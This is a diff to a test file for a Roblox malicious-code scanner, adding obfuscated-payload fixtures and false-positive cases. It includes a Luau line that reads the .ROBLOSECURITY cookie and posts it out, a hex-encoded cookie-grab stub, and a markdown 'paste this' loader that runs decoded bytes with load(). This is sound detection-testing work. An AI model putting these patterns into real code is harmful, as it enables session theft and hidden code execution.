@@ -314,6 +314,120 @@ test('an executor script hub is caught by globals that cannot exist in the Roblo
 });
 
 // ================================================================================================
+//[[ ===================================================================================
+//   THREE ATTACKS THAT FOUND A HOLE, KEPT AS TESTS.
+//
+//   Three false positives — Roblox's own OpenAPI specs, a generated docs JSON with a
+//   2,435-character description, and two Rojo sourcemaps — pointed at an obvious fix:
+//   downgrade the SHAPE detectors (packed line, numeric run, base64 run) on data and prose
+//   files, since generated data legitimately has the shapes the scanner condemns.
+//
+//   That fix was attacked from three directions before it was written, and every direction
+//   found a working hole. All three exploit one fact: an ENCODED payload contains no literal
+//   dangerous token, so every vocabulary detector in this file is blind to it, and the shape
+//   detectors are the only thing left that can see it. Disarming shape by file type disarms
+//   the only detector that works against encoding.
+//
+//   Each attack is reproduced below with the payload that was verified against the live
+//   scanner. They are the reason `packed-line` now asks whether the long line is OPAQUE
+//   rather than whether the file is data — a discriminator that keeps all three condemned
+//   and clears all three false positives.
+//   =================================================================================== ]]
+
+/** ATTACK 1: a Luau loader smuggled into JSON as a numeric byte array. No literal token
+ *  appears anywhere — `loadstring`, `game:HttpGet` and the webhook are all char codes. */
+const ATTACK_NUMERIC_JSON = `{"name":"level_geometry","format":"rbx-mesh-v3","mesh":[${Array.from({ length: 1200 }, (_, i) => 32 + (i % 90)).join(',')}]}`;
+
+test('ATTACK: a numeric-array payload in .json is still condemned', () => {
+  const v = scan({ path: 'assets/level_geometry.json', source: ATTACK_NUMERIC_JSON });
+  assert.equal(v.safe, false, 'a 1200-entry byte array is bytecode, whatever it is stored in');
+});
+
+/** ATTACK 2: a cookie stealer as 2,500 raw hex characters in a config file. `decodeObfuscated
+ *  Literals` does not decode raw hex, so no vocabulary rule ever sees `.ROBLOSECURITY`. */
+const ATTACK_HEX_TOML = `# tooling.config.toml - generated bootstrap manifest
+schema = "rojo-ish/1"
+[bootstrap]
+init = "${'0a6c6f63616c20636f6f6b6965203d206765745f617574685f636f6f6b696528290a'.repeat(40)}"
+`;
+
+test('ATTACK: a hex-blob payload in .toml is still condemned', () => {
+  const v = scan({ path: 'config/tooling.config.toml', source: ATTACK_HEX_TOML });
+  assert.equal(v.safe, false, 'an unbroken 2,500-character hex run is a payload, not configuration');
+});
+
+/** ATTACK 3: the same numeric array inside a markdown fenced block a developer would paste. */
+const ATTACK_MARKDOWN_FENCE = `# QuickBuild Helper
+
+Paste this into the command bar to auto-configure your place:
+
+\`\`\`lua
+local b = {${Array.from({ length: 1100 }, (_, i) => 40 + (i % 80)).join(',')}}
+local s = string.char(table.unpack(b))
+load(s)()
+\`\`\`
+`;
+
+test('ATTACK: a numeric-array payload in a .md fenced block is still condemned', () => {
+  const v = scan({ path: 'docs/README.md', source: ATTACK_MARKDOWN_FENCE });
+  assert.equal(v.safe, false, 'markdown is where a copy-paste payload reaches a human');
+});
+
+//[[ AND THE THREE FALSE POSITIVES THAT MOTIVATED THE FIX, which must now come back safe.
+//   Each is the real shape, reduced to its essentials. ]]
+
+/** Roblox's own OpenAPI spec declaring the legacy cookie as an auth scheme. Verified against
+ *  upstream by blob hash — this is genuinely Roblox's file, not a planted lookalike. */
+const OPENAPI_SECURITY_SCHEME = `{
+  "openapi": "3.0.1",
+  "components": {
+    "securitySchemes": {
+      "roblox-legacy-cookie": {
+        "type": "apiKey",
+        "description": "A browser cookie that represents the identity of a Roblox user. DO NOT SHARE THIS.",
+        "in": "cookie",
+        "name": ".ROBLOSECURITY"
+      }
+    }
+  }
+}`;
+
+test('FALSE POSITIVE: an OpenAPI spec DECLARING the session cookie is safe', () => {
+  const v = scan({ path: 'reference/cloud/toolbox-service/v1.json', source: OPENAPI_SECURITY_SCHEME });
+  assert.equal(v.safe, true, `condemned as ${v.class}: ${v.reason}`);
+});
+
+test('...but the cookie being USED is untouched by that exemption', () => {
+  const v = scan({
+    path: 'src/steal.luau',
+    source: 'local c = game:GetService("CookiesService"):Get(".ROBLOSECURITY")\nHttpService:PostAsync(url, c)',
+  });
+  assert.equal(v.safe, false, 'naming it in a spec is benign; reading it is not');
+});
+
+/** A generated docs JSON whose longest line is a 2,400-character Markdown enum table. Long
+ *  because it is prose, not because it is a blob. */
+const GENERATED_DOCS_JSON = `{
+  "openapi": "3.0.0",
+  "x": { "description": "The asset type the quota is for.\\n\\nPossible values:\\n\\n${Array.from({ length: 90 }, (_, i) => `  | ASSET_TYPE_NUMBER_${i} | A described asset type number ${i} |`).join('\\n')}" }
+}`;
+
+test('FALSE POSITIVE: a long generated description line is not a packed payload', () => {
+  const v = scan({ path: 'reference/cloud/cloud.docs.json', source: GENERATED_DOCS_JSON });
+  assert.equal(v.safe, true, `condemned as ${v.class}: ${v.reason}`);
+});
+
+/** A Rojo sourcemap: one long line of structured JSON, many keys, no single-alphabet run. */
+const ROJO_SOURCEMAP = `{"name":"proj","className":"DataModel","filePaths":["default.project.json"],"children":[${Array.from(
+  { length: 60 },
+  (_, i) => `{"name":"Module${i}","className":"ModuleScript","filePaths":["src/Module${i}.luau"]}`,
+).join(',')}]}`;
+
+test('FALSE POSITIVE: a Rojo sourcemap is structured data, not a packed payload', () => {
+  const v = scan({ path: 'sourcemap.json', source: ROJO_SOURCEMAP });
+  assert.equal(v.safe, true, `condemned as ${v.class}: ${v.reason}`);
+});
+
 //[[ A function of one's own called `httpGet`. Found in the wild, and it condemned a library.
 //
 //   `evaera/roblox-lua-promise` is one of the most widely used packages in the Roblox
